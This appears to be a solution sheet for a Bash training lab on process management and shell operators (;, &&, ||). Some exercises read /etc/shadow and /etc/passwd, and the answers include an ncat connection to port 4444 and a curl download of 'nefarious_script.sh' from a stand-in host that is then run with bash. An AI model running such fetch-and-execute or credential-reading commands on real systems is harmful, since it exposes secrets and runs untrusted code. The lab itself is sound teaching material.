# Bash Sorcery

## Instructions

### Running Commands and Managing Processes

- On your Alpine machine, list your current user's running processes.
  - How many do you see?
    > **Solution**: You should see two processes—`bash` (with PID 1), and `ps` (with a variable PID—mine was 10 on the first run).

  - One of the processes is _not_ bash. What is its PID?
    > **Solution**: The other process is `ps`, the currently running command. In my case, `ps` had a PID of 10.

  - Run the same command three or four times. How does the PID of this process each time?
    > **Solution**: The PID simply increased by one on each run.
  
- Next, run: `ping --help`. Identify the command-line flag you need to send a specific number of pings.
    > **Solution**: Use the flag: `-c <Number of Pings>`.

- Use this flag to ping `google.com` 100 times. Note that you can't use your Terminal to issue new commands while this is running.
    > **Solution**: `ping -c 100 google.com`

- Press `Ctrl + C` to stop the ping command. Then, run the same command in the background.
    > **Solution**: `ping -c 100 google.com &`

- List your running processes. 
  - What do you see in the list of processes?
    > **Solution**: Now, you'll see `bash`, `ps`, _and_ `ping` in the output of `ps`.
  - What other peculiarity do you notice about the backgrounded ping?...
    > **Solution**: You'll also notice that `ping` keeps printing to the terminal, even though it's backgrounded...Annoying.

- Find the PID of the ping command you just ran. Run: `kill <PID of ping Process>`.
  - What happens to the strange behavior after running this command?
    > **Solution**: It stops. This is because the `kill` command ends the `ping` process, which means it won't continue to print output to the terminal.

  - List your running processes one last time. Do you see what you expect?
    > **Solution**: I saw only the processes for `bash` and `ps`, which is aligned with expectations.

### Flow Controls

#### Semicolon

- Use the semicolon operator to print both `/etc/passwd` and `/etc/shadow`.
    > **Solution**: `cat /etc/passwd; cat /etc/shadow`

- Try to use the semicolon operator to print `/etc/nonexistent` and `/etc/passwd`, _in that order_. 
    > **Solution**: `cat /etc/nonexistent; cat /etc/passwd`. This prints an error for the first command, and the contents of `/etc/passwd` for the second.

#### Logical And (Double Ampersand)

- Use the double ampersand operator to print both `/etc/passwd` and `/etc/shadow`.
    > **Solution**: `cat /etc/passwd && cat /etc/shadow`.

- Try to use the double ampersand operator to print `/etc/nonexistent` and `/etc/passwd`, _in that order_. 
    > **Solution**: `cat /etc/nonexistent && cat /etc/password`. This prints only the error for `cat /etc/nonexistent`, and _ignores_ the command `cat /etc/passwd`.

#### Logical Or (Double Pipe)

- Try to print out the contents of `/etc/shadow`, and use the double pipes to print an error message if there's a problem.
    > **Solution**: `cat /etc/shadow || echo "That didn't work."`

- Run the same command, but try to print the contents of `/etc/nonexistent` instead of `/etc/shadow`.
    > **Solution**: `cat /etc/nonexistent || echo "That didn't work."` This prints the error message from `cat`, then runs the `echo` command.

## Questions

- Write a command line that attempts to use `ncat` to connect to port `4444` on host `172.18.1.16`. If the connection fails, try to ping the host, instead.
    > **Solution**: `ncat 172.18.1.16 4444 || ping 172.18.1.16`

- Write a command line that creates a new directory, called `New_Directory`, and then changes into that directory, _if and only if_ it was created successfully.
    > **Solution**: `mkdir New_Directory && cd New_Directory`

- Write a command line that uses `curl` to download the file at `http://fake.site/nefarious_script.sh`, and then runs it with `bash` _if and only if_ it downloaded successfully.
    > **Solution**: `curl -O http://fake.site/nefarious_script.sh && bash nefarious_script.sh`

- Write a command line that runs the command `planA`, and runs the command `planB` _if and only if_ `planA` fails.
    > **Solution**: `planA || planB`

## Extension

### Streams

- You can "mute" a backgrounded process by redirecting everything it prints to Linux's "black hole" for unwanted process output, called `/dev/null`.
  - TO do this with the ping example, you'd run: `ping -c 100 8.8.4.4 &> /dev/null`.
  - This runs the ping command, but throws away everything it prints to the terminal—including error information!

- For more information, refer to Chapter 20 of the Advanced Bash Scripting Guide, on **I/O Redirection**: <https://www.tldp.org/LDP/abs/html/io-redirection.html>

- Note that you can also solve the `New_Directory` challenge with: `mkdir New_Directory && cd $_`.
  - For more information on `$_`, refer to the list of Special Shell Variables in the Advanced Bash Scripting Guide: <https://www.tldp.org/LDP/abs/html/refcards.html#AEN22402>
